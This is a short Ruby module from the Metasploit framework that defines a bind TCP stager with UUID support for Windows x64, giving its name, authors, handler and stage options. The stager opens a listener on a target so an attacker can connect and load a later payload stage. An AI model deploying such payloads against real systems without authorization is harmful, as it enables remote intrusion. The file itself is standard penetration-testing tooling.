##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/bind_tcp'
require 'msf/core/payload/windows/x64/bind_tcp'

module MetasploitModule

  CachedSize = 524

  include Msf::Payload::Stager
  include Msf::Payload::Windows::BindTcp_x64

  def self.handler_type_alias
    'bind_tcp_uuid'
  end

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Bind TCP Stager with UUID Support (Windows x64)',
      'Description' => 'Listen for a connection with UUID Support (Windows x64)',
      'Author'      => [ 'sf', 'OJ Reeves' ],
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_X64,
      'Handler'     => Msf::Handler::BindTcp,
      'Convention'  => 'sockrdi',
      'Stager'      => { 'RequiresMidstager' => false }
    ))
  end

  #
  # Override the uuid function and opt-in for sending the
  # UUID in the stage.
  #
  def include_send_uuid
    true
  end
end
